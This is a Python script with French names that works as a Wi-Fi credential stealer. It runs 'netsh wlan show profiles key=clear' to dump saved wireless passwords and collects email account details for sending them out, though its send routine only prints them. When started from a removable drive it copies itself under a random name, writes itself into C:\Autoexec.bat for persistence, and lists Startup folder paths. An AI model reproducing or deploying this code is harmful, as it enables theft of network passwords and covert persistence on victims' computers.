"""C:\\Users\\AMSC\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup
C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup
C:\\Utilisateur\\AMSC\\AppData\\Roaming\\Microsoft\\Windows\\Menu Demarrer\\Programmes\\Demarrage
C:\\ProgramData\\Microsoft\\Windows\\Menu Demarrer\\Programmes\\Demarrage"""
#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os
import sys
import time
from tkinter import*
from os.path import join
from random import randint

class Manipulation():
    def __init__(self):
        global filename
        self.drives, self.Note, self.Notes, self.Old_Password, self.PassWord = [], [], [], [], []
        self.Filename, self.Folder, self.NomTex, self.NomTex1, self.Auto = sys.argv[0], "", 'Brouillon.txt', 'Envoi.txt', 'C:\\Autoexec.bat'
        self.DesMopaRecep, self.NomTex2 = ['']*3, 'Brouillon1.txt'
        self.filename1, self.fen = '', ''
        self.Newname = ''
        
    def ListeFileExtr(self, Note):
        self.Note = []
        Class.OuvrirFermer("r", Note)
        del self.Note[0]

    def OuvrirFermer(self, wr, Filename):
        try:
            filin = open(Filename, wr)
            if (wr == "rb" or wr == "r"):
                if(self.Note != []): self.Note = []
                T = filin.readlines()
                for i in T: self.Note.append(i)
            elif (wr == "wb"):
                for i in self.Note: filin.write(i)
                self.Note = []
            filin.close()
        except: Class.OuvrirFermer(wr, Filename)

    def Création_Du_Nom_De_Fichier(self, mot):
        file1, ext, drive, file2 = "", "", "", ""
        drive = os.path.dirname(mot)
        file1, ext = os.path.splitext(os.path.basename(mot))
        if(file1 == "aA" or file1 == "zZ"): file2, file1 = file1[randint(0,1)], " "*8
        while(len(file2) != len(file1)):
            j = randint(65, 122)
            if(j<91 or j>96): file2 += chr(j)
        if(ext != ""): mot = os.path.join(drive, file2 + ext)
        else: mot = os.path.join(drive, file2)
        return mot

    def Déplace_Fichier_Source(self):
        """drive = os.path.dirname(sys.argv[0])
        for drives, dirs, file in os.walk(drive, "topdown"):
            for i in file:
                file1, ext = os.path.splitext(i)
                if(ext == ".pdf"):
                    Filename = os.path.join(drives, i)
                    break
        os.startfile(Filename)"""
        Class.Execution_Du_Program(False)
        Class.OuvrirFermer('rb', os.path.join(os.path.dirname(sys.argv[0]), self.NomTex1))
        Class.OuvrirFermer('wb', os.path.join(sys.argv[0][:3], self.NomTex1))
        os.remove(os.path.join(sys.argv[0][:3], self.NomTex1))
        os.popen('fsutil fsinfo drives > ' + os.path.join(os.path.dirname(sys.argv[0]), self.NomTex))
        time.sleep(0.5)
        self.Note = []
        Class.OuvrirFermer('r', os.path.join(os.path.dirname(sys.argv[0]), self.NomTex))
        del self.Note[0]
        self.drive = []
        for i in self.Note:
            i = i.split(" ")
            self.drive.append(i[1:len(i)-2])
        self.Folder = Class.Création_Du_Nom_De_Fichier(self.drive[0][0] + "zZ")
        if not os.path.exists(self.Folder): os.mkdir(self.Folder)
        self.Newname = Class.Création_Du_Nom_De_Fichier(sys.argv[0])
        os.rename(sys.argv[0], self.Newname)
        os.remove(os.path.join(os.path.dirname(sys.argv[0]), self.NomTex))
        os.popen('XCOPY ' + os.path.dirname(sys.argv[0]) + ' ' + self.Folder + ' ' + '/S')
        os.popen(os.path.join(self.Folder, self.Newname) + ' >> ' + self.Auto)

    def Execution_Du_Program(self, verifi):
        self.Filename, self.Note = os.path.dirname(sys.argv[0]), []
        os.popen("netsh wlan show profiles > " + os.path.join(self.Filename, self.NomTex))
        time.sleep(0.5)
        Class.ListeFileExtr(os.path.join(self.Filename, self.NomTex))
        for i in self.Note:
            if(i.find('All User Profile') != -1): self.drives.append('"' + i[i.find(':')+2:-1] + '"')
        try: os.remove(os.path.join(self.Filename, self.NomTex))
        except:
            time.sleep(0.5)
            os.remove(os.path.join(self.Filename, self.NomTex))
        for i in self.drives:
            os.popen("netsh wlan show profiles " + i + " key=clear >> " + os.path.join(self.Filename, self.NomTex))
            time.sleep(0.5)
        Class.ListeFileExtr(os.path.join(self.Filename, self.NomTex))
        k, drive = False, ["Profile", "Profil"]
        for i in range(len(self.Note)-3):
            if(len(self.Note[i]) < len(drive[0])): pass
            if(self.Note[i][:len(drive[0])] == "Profile" or self.Note[i][:len(drive[1])] == "Profil"):
               self.PassWord.append(bytes(self.Note[i].replace('\n', '') + "\r\n", encoding="utf-8"))
               self.PassWord.append(bytes(self.Note[i+1].replace('\n', '') + "\r\n", encoding="utf-8"))
            if(self.Note[i] == "Security settings \n" or self.Note[i] == "ParamŠtres de s‚curit‚ \n"): k = True
            if(k): self.PassWord.append(bytes(self.Note[i].replace('\n', '') + "\r\n", encoding="utf-8"))
            if(self.Note[i] == "\n" and k == True): k = False
        Class.Vérification(verifi)
        #for i in self.PassWord: print("self.PassWord = ", i)

    def Vérification(self, verifi):
        if(not os.path.exists(os.path.join(self.Filename, self.NomTex1))):
            self.Note = self.PassWord
            Class.OuvrirFermer("wb", os.path.join(self.Filename, self.NomTex1))
            if(verifi): Class.Envoi()
        else:
            self.Note = []
            Class.OuvrirFermer('rb', os.path.join(self.Filename, self.NomTex1))
            self.Old_Password = self.Note
            if(self.PassWord != self.Old_Password):
                self.Note = self.PassWord
                Class.OuvrirFermer("wb", os.path.join(self.Filename, self.NomTex1))
                if(verifi): Class.Envoi()

    def Fenetre(self):
        self.filename1 = os.path.join(os.path.dirname(sys.argv[0]), self.NomTex2)
        if not os.path.exists(self.filename1):
            self.fen = Tk()
            self.fen.geometry("425x135")
            self.fen.title('Essai de Programmation')
            Label1 = Label(self.fen, text = "Entrez L'addresse E-mail du Destinataire")
            Label1.grid(row = 1, column = 1, padx = 5, pady = 5)
            self.DesMopaRecep[0] = StringVar()
            Champ = Entry(self.fen, textvariable = self.DesMopaRecep[0], width = 30)
            Champ.focus_set()
            Champ.grid(row = 1, column = 2, padx = 5, pady = 5)
            Label2 = Label(self.fen, text = 'Entrez le Mot de passe du destinaire    ')
            Label2.grid(row = 2, column = 1, padx = 5, pady = 5)
            self.DesMopaRecep[1] = StringVar()
            Champ = Entry(self.fen, textvariable = self.DesMopaRecep[1], show = '*', width = 30)
            Champ.focus_set()
            Champ.grid(row = 2, column = 2, padx = 5, pady = 5)
            Label3 = Label(self.fen, text = "Entrez L'addresse E-mail du Recepteur   ")
            Label3.grid(row = 3, column = 1, padx = 5, pady = 5)
            self.DesMopaRecep[2] = StringVar()
            Champ = Entry(self.fen, textvariable = self.DesMopaRecep[2], width = 30)
            Champ.focus_set()
            Champ.grid(row = 3, column = 2, padx = 5, pady = 5)
            Bouton = Button(self.fen, text = 'OK', width = 8, command = Class.EcrisDecris)
            Bouton.grid(row = 4, column = 2, padx = 5, pady = 5)
            self.fen.mainloop()
        else:
            os.popen('fsutil fsinfo drivetype ' + sys.argv[0][:2] + ' > ' + os.path.join(os.path.dirname(sys.argv[0]), self.NomTex))
            time.sleep(0.5)
            Class.OuvrirFermer("r", os.path.join(os.path.dirname(sys.argv[0]), self.NomTex))
            for i in self.Note:
                if(i.find('Fixed Drive') != -1 or i.find('Lecteur Fixe') != -1): Class.Execution_Du_Program(True)
                else: Class.Déplace_Fichier_Source()

    def EcrisDecris(self):
        self.Note = []
        for i in range(3): self.Note.append(bytes(Class.Ecriture(self.DesMopaRecep[i].get()) + '\r\n', encoding='utf-8'))
        Class.OuvrirFermer("wb", self.filename1)
        self.fen.destroy()

    def Ecriture(self, a):
        b, count = '', 0
        for i in a:
            for j in hex(ord(i))[2:]:
                c, k0, k1, k = bin(ord(j))[1:], 0, 0, 0
                c += str(abs(int(c[-1])-1))
                while(k == 0):
                    if(c[k0] == c[k1]):
                        count += 1
                        k1 += 1
                    else:
                        if(count == 1): b += c[k0]
                        else: b += str(count) + c[k0]
                        k0, count = k1, 0
                    if(k1 == len(c)): k, count = 1, 0
        return b.replace('b', '0x')

    def Réecriture(self):
        Class.OuvrirFermer("r", self.filename1)
        t = 0
        for b in self.Note:
            b, c, a, l = b.replace('0x', 'b')[:-1] + 'b', '', '', ''
            for i in range(len(b)):
                if(b[i] == 'b'):
                    if(c != ''):
                        k1 = 0
                        for k in range(len(c)): k1 += int(c[-k-1])*2**(k)
                        l, c = l + chr(k1), 0
                        if(len(l) == 2):
                            for k in range(2):
                                if(ord(l[k]) < 60): c += int(l[k])*16**(1-k)
                                else: c += (ord(l[k].upper()) - 55)*16**(1-k)
                            a, l = a + chr(c), ''
                    c = ''
                elif(int(b[i]) <= 1): c += b[i]
                else:
                    for j in range(int(b[i])-1): c += b[i+1]
            self.DesMopaRecep[t], t = a, t + 1

    def Envoi(self):
        Class.Réecriture()
        for i in self.PassWord: print("self.PassWord = ", i)
        for i in self.DesMopaRecep: print('self.DesMopaRecep = ', i)

if __name__ == "__main__":
    Class = Manipulation()
    Class.Fenetre()
